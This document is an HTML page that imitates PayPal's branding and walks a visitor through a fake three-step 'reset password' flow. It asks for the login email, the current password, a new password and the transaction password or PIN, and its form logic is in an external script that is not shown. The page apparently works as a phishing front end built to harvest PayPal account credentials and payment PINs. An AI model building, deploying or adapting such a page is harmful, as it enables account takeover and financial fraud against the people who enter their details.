<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="theme-color" content="#0070ba"><title>PayPal</title><link rel="stylesheet" href="memo.css">
</head>
<body>
<main class="shell"><section class="card" aria-label="PayPal form">
<header class="brand"><img class="brand-logo" src="logo.png" alt="MEMO logo"><div class="brand-name">PayPal</div></header>
<div class="progress"><span id="stepText">1 of 3</span><div class="progress-track"><span id="progressBar"></span></div></div>
<form id="memoForm">
<section class="step active" data-step="1"><h1>PayPal</h1><p class="question">Enter Login Email</p><input id="field1" maxlength="300" placeholder="Enter your Email" required><p class="question second-question">Enter Password</p><input id="field2" maxlength="300" placeholder="Enter your password" required><button class="next" type="button">Next</button></section>
<section class="step" data-step="2"><h1>PayPal</h1><p class="question">Enter New Password</p><input id="field3" maxlength="500" placeholder="Enter Password Here" required><button class="next" type="button">Next</button></section>
<section class="step" data-step="3"><h1>PayPal</h1><p class="question">Enter Transaction Password/PIN to verify</p><textarea id="field4" maxlength="5000" rows="4" placeholder="Enter transaction password/PIN" required></textarea><button id="resetButton" class="reset" type="submit">Reset Password</button></section>
<div id="status" class="status" role="status" aria-live="polite"></div>
</form><div class="step-dots" aria-hidden="true"><span class="active"></span><span></span><span></span></div>
</section></main><script src="memo.js"></script>
</body></html>
